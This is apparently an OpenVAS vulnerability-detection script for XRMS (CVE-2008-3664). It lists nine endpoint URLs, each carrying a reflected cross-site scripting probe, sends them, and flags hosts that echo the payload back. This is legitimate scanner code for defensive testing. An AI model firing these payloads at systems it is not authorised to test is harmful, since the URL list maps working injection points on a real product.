# SPDX-FileCopyrightText: 2009 Christian Eric Edjenguele
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.101008");
  script_version("2023-04-18T10:19:20+0000");
  script_tag(name:"last_modification", value:"2023-04-18 10:19:20 +0000 (Tue, 18 Apr 2023)");
  script_tag(name:"creation_date", value:"2009-03-15 21:44:50 +0100 (Sun, 15 Mar 2009)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2008-3664");
  script_name("XRMS Multiple Vulnerabilities (CVE-2008-3664)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Christian Eric Edjenguele");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"XRMS is prone to multiple Cross-Site Scripting (XSS) and SQL
  injection (SQLi) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP GET requests and checks the responses.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

pages = make_list( "/login.php?target=test<script>alert('attack');</script>",
                   "/activities/some.php?title=test<script>alert('attack');</script>",
                   "/companies/some.php?company_name=test<script>alert('attack');</script>",
                   "/contacts/some.php?last_name=test<script>alert('attack');</script>",
                   "/campaigns/some.php?campaign_title=test<script>alert('attack');</script>",
                   "/opportunities/some.php?opportunity_title=test<script>alert('attack');</script>",
                   "/cases/some.php?case_title=test<script>alert('attack');</script>",
                   "/files/some.php?file_id=test<script>alert('attack');</script>",
                   "/reports/custom/mileage.php?starting=test<script>alert('attack');</script>" );

foreach dir( make_list_unique( "/", "/xrms", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  url = dir + "/login.php";

  buf = http_get_cache( item:url, port:port );
  if( ! buf || buf !~ "^HTTP/1\.[01] 200" )
    continue;

  if( "<title>XRMS : XRMS</title>" >!< buf &&
      '<div id="page_header">XRMS</div>' >!< buf &&
      'href="http://sourceforge.net/projects/xrms/">' >!< buf )
    continue;

  foreach php( pages ) {
    url = dir + php;
    if( http_vuln_check( port:port, url:url, pattern:"<script>alert\('attack'\);</script>", extra_check:"test", check_header:TRUE ) ) {
      report = http_report_vuln_url( url:url, port:port );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
